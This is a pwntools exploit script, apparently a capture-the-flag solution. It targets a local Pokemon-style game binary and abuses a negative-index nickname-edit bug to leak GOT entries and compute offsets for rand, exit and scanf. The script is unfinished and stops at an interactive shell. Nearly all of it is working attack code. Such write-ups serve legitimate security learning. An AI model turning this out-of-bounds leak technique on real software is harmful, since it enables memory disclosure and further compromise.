from pwn import * 

binary = ("./program")

p = process(binary)

#libc = ELF('./libc.so.6')

elf = ELF(binary)
s = 'b*play+916'
#gdb.attach(p, s)
p.sendline(b'1') # press any key to continue

# get a full team first (actually maybe 2 is enough )

# one pokemon to leak a got address
'''
while True:
    output = p.recvuntil("0: Exit")  # Read output until this message
    if b"Your team is full!" in output:  # Check if the message is received
        break
    p.sendline(b'1')
    p.recvuntil("  1: Attack    2: UwUmon    3: UwUball    4. R̵͎̈ṵ̶͊n!")
    p.sendline(b'3')

'''
p.sendline(b'3')
p.recvuntil("  Whose nickname do you want to edit? (Please enter an index)")
p.sendline(b'-2')
p.recvuntil("Please get a new name to ")

GOT_leak1 = int.from_bytes(p.recvuntil("!", drop = True), 'little')


base = GOT_leak1 - 0x430
print(hex(base))

p.sendlineafter("What is its new nickname?", GOT_leak1.to_bytes(6, 'little'))

p.sendline(b'3')
p.recvuntil("  Whose nickname do you want to edit? (Please enter an index)")
p.sendline(b'-3')
p.recvuntil("Please get a new name to ")

GOT_leak2 = int.from_bytes(p.recvuntil("!", drop = True), 'little')

print(hex(GOT_leak1))



p.sendlineafter("What is its new nickname?", GOT_leak2.to_bytes(6, 'little'))



p.sendline(b'3')
p.recvuntil("  Whose nickname do you want to edit? (Please enter an index)")
p.sendline(b'-6')
p.recvuntil("Please get a new name to ")

GOT_leak3 = int.from_bytes(p.recvuntil("!", drop = True), 'little')


rand = GOT_leak1 - base
exit = GOT_leak2 - base 
__isoc99_scanf = GOT_leak3 - base

print(f"rand offset: {hex(rand)}")
print(f"exit offset: {hex(exit)}")
print(f"__isoc99_scanf offset: {hex(__isoc99_scanf)}")

p.sendlineafter("What is its new nickname?", GOT_leak3.to_bytes(6, 'little'))
p.interactive()

#print(libc.sym['rand'])
#libc.address = GOT_leak - libc.sym['rand']
#print(hex(libc.address))
#print(hex(libc.sym['rand']))
#print(hex(GOT_leak))

